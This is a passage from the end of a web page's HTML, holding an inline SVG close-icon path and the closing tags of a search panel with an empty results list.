    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
